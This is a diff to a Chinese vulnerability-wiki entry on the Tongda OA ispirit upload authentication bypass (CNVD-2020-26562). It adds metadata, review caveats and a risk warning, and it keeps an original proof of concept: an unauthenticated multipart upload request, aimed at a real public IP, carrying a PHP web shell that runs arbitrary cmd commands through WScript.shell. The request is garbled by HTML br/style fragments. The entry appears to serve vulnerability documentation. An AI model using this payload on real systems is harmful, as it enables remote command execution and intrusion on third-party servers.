@@ -1,12 +1,53 @@
 ---
-cnvd: "CNVD-2020-26562"
-fofa: "的搜索可以看到通达 OA 系统应用非常广泛, 这就给同学们提供了大量的实战环境. 当然大家一定要做一个正直的白帽子."
 source: "MrWQ/vulnerability-paper"
+title: "通达OA ispirit上传认证绕过及gateway包含链"
+product: "通达OA"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: "CNVD-2020-26562"
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "V11≤11.3 20200103/2017≤10.19 20190522/2016≤9.13/2015≤8.15/2013增强≤7.25/2013≤6.20声明"
+prerequisites: "未授权；Windows COM及服务身份"
+side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+identifier_role: "primary"
+source_url: "https://mp.weixin.qq.com/s/Ntu5UKA2pUe7HaA9dVBYjA"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BE%20OA%20%E6%BC%8F%E6%B4%9E%E6%AF%94%20getshell%20%E8%BF%98%E8%A6%81%E7%89%9B%E7%9A%84%20system%20%E6%9D%83%E9%99%90.md"
+fofa_unverified: "的搜索可以看到通达 OA 系统应用非常广泛, 这就给同学们提供了大量的实战环境. 当然大家一定要做一个正直的白帽子."
+category_recommendation: "OA / 通达"
+id: "vw-55ec24720df0ead48d1a5f8e"
+entity_id: "ve-55ec24720df0ead48d1a5f8e"
+schema_version: "1"
 ---
 
-# 通达 OA 漏洞比 getshell 还要牛的 system 权限
+# 通达OA ispirit上传认证绕过及gateway包含链
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：通达OA；ispirit上传认证绕过及gateway包含链
+- 版本、配置及部署条件：V11≤11.3 20200103/2017≤10.19 20190522/2016≤9.13/2015≤8.15/2013增强≤7.25/2013≤6.20声明
+- 认证与权限前提：未授权；Windows COM及服务身份
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- FOFA字段整段宣传不是检索式；大量br/style污染代码，multipart name/filename丢失
+- is_uploadable解释称点之前作为扩展，实际substr取点之后；DEST_UID非0说法漏UPLOAD_MODE=2分支
+- 标题system权限是实验服务身份，不是独立提权漏洞；CNVD归属需核验
+- 含公开IP和会话需占位；补丁无文件hash/build
+
+## 操作风险
+
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ntu5UKA2pUe7HaA9dVBYjA)
 
 **高质量的安全文章，安全 offer 面试经验分享**
@@ -182,8 +223,8 @@ function is_uploadable($FILE_NAME)<br style="overflow-wrap: break-word !importan
 
 3. 改包，如下 POC
 
-```
-POST /ispirit/im/upload.php HTTP/1.1<br style="overflow-wrap: break-word !important;">Host: 218.107.46.235<br style="overflow-wrap: break-word !important;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0<br style="overflow-wrap: break-word !important;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br style="overflow-wrap: break-word !important;">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br style="overflow-wrap: break-word !important;">Accept-Encoding: gzip, deflate<br style="overflow-wrap: break-word !important;">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Length: 564<br style="overflow-wrap: break-word !important;">Origin: http://localhost<br style="overflow-wrap: break-word !important;">Connection: close<br style="overflow-wrap: break-word !important;">Referer: http://localhost/<br style="overflow-wrap: break-word !important;">Cookie: Phpstorm-9102a7e6=cc1a9f2c-c084-4378-8aa3-e42492123b1c; PHPSESSID=18p3ov5rtc2i1elr4dvje9m1b3<br style="overflow-wrap: break-word !important;">Upgrade-Insecure-Requests: 1<br style="overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Disposition: form-data; overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;">2<br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Disposition: form-data; overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;">123<br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Disposition: form-data; overflow-wrap: break-word !important;">Content-Type: image/jpeg<br style="overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;"><?php<br style="overflow-wrap: break-word !important;">$command=$_POST['cmd'];<br style="overflow-wrap: break-word !important;">$wsh = new COM('WScript.shell');<br style="overflow-wrap: break-word !important;">$exec = $wsh->exec("cmd /c ".$command);<br style="overflow-wrap: break-word !important;">$stdout = $exec->StdOut();<br style="overflow-wrap: break-word !important;">$stroutput = $stdout->ReadAll();<br style="overflow-wrap: break-word !important;">echo $stroutput;<br style="overflow-wrap: break-word !important;">?><br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB--<br style="overflow-wrap: break-word !important;">
+```http
+POST /ispirit/im/upload.php HTTP/1.1<br style="overflow-wrap: break-word !important;">Host: 218.107.46.235<br style="overflow-wrap: break-word !important;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0<br style="overflow-wrap: break-word !important;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br style="overflow-wrap: break-word !important;">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br style="overflow-wrap: break-word !important;">Accept-Encoding: gzip, deflate<br style="overflow-wrap: break-word !important;">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Length: 564<br style="overflow-wrap: break-word !important;">Origin: http://localhost<br style="overflow-wrap: break-word !important;">Connection: close<br style="overflow-wrap: break-word !important;">Referer: http://localhost/<br style="overflow-wrap: break-word !important;">Cookie: Phpstorm-9102a7e6=cc1a9f2c-c084-4378-8aa3-e42492123b1c; PHPSESSID=1************************3<br style="overflow-wrap: break-word !important;">Upgrade-Insecure-Requests: 1<br style="overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Disposition: form-data; overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;">2<br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Disposition: form-data; overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;">123<br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Disposition: form-data; overflow-wrap: break-word !important;">Content-Type: image/jpeg<br style="overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;"><?php<br style="overflow-wrap: break-word !important;">$command=$_POST['cmd'];<br style="overflow-wrap: break-word !important;">$wsh = new COM('WScript.shell');<br style="overflow-wrap: break-word !important;">$exec = $wsh->exec("cmd /c ".$command);<br style="overflow-wrap: break-word !important;">$stdout = $exec->StdOut();<br style="overflow-wrap: break-word !important;">$stroutput = $stdout->ReadAll();<br style="overflow-wrap: break-word !important;">echo $stroutput;<br style="overflow-wrap: break-word !important;">?><br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB--<br style="overflow-wrap: break-word !important;">
 ```
 
 单包发送，会返回一个数据包，数据包包含了文件上传的路径。
